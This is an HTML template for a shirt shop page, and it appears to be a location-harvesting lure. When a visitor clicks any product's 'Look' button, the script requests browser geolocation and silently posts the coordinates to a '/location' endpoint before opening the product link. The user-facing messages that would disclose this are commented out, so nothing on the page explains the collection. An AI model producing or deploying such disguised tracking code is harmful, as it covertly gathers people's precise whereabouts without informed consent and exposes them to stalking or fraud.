<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Shirts Store</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 1rem;
      background: #f5f5f5;
    }

    .grid {
      display: flex;
      flex-wrap: wrap;
      gap: 1rem;
      justify-content: center;
    }

    .card {
      background: white;
      border-radius: 10px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      max-width: 300px;
      width: 100%;
      overflow: hidden;
      text-align: center;
    }

    .card img {
      width: 100%;
      height: auto;
    }

    .card h3 {
      margin: 0.5rem 0 0;
    }

    .card p {
      margin: 0.5rem 0;
      color: #333;
    }

    .card button {
      background: #007bff;
      color: white;
      border: none;
      padding: 10px 20px;
      margin-bottom: 1rem;
      cursor: pointer;
      border-radius: 5px;
    }

    .card button:disabled {
      background: #888;
    }

    .loading {
      display: none;
      font-size: 14px;
      color: green;
      margin-top: 5px;
    }

    @media screen and (max-width: 600px) {
      .card {
        max-width: 100%;
      }
    }
  </style>
</head>
<body>

  <h2 style="text-align: center;">üõçÔ∏è Choose Your Shirt</h2>
  <div class="grid">
    {% for shirt in shirts %}
      <div class="card">
        <img src="/static/{{ shirt.image | lower | replace(' ', '-') }}.jpg" alt="{{ shirt.name }}" />
        <h3>{{ shirt.name }}</h3>
        <p>{{ shirt.price }}</p>
        <button onclick="saveAndRedirect('{{ shirt.link }}', this)">Look</button>
        <div class="loading">Loading...</div>
      </div>
    {% endfor %}
  </div>

  <script>
    async function saveAndRedirect(link, btn) {
      const card = btn.closest('.card');
      const loader = card.querySelector('.loading');
      btn.disabled = true;
      loader.style.display = 'block';

      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject);
        });

        const coords = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        };

        const res = await fetch("/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(coords)
        });

        const result = await res.json();
        // console.log("‚úÖ DB Response:", result);

        // loader.textContent = "‚úÖ Location saved!";
        setTimeout(() => {
          window.open(link, "_blank");
          loader.style.display = 'none';
          btn.disabled = false;
        }, 1000);
      } catch (err) {
        // alert("‚ùå Location permission required or network error.");
        loader.style.display = 'none';
        btn.disabled = false;
      }
    }
  </script>

</body>
</html>
